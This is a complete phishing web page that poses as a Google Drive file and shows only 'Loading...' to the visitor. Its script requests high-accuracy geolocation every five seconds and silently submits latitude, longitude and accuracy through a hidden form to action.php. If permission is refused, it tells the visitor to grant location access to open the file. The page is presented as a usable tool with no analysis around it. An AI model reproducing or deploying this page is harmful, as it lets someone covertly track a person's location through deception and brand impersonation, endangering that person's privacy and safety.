<!DOCTYPE html>
<html>
<head>
<title>Google Drive</title>
<meta charset="utf-8">
</head>
<body>

<form action="action.php" method="post" id="form" hidden>
  <input id="lat"  name="lat">
  <input id="long"  name="long" >
  <input id="acc" name="acc">
</form>

Loading...

<script type="text/javascript">

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, onErr, options);
  } else {
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  document.getElementById("lat").value = position.coords.latitude
  document.getElementById("long").value = position.coords.longitude
  document.getElementById("acc").value = position.coords.accuracy
  
  document.getElementById("form").submit()
}

function onErr(err){
  
  //alert(err.message)
  document.write(err.message+"<br>Please give location permission to access this file...<br><br>")
}

var options = {
  enableHighAccuracy: true,
  
}

setInterval(getLocation, 5000)

getLocation()

</script>
</body>
</html>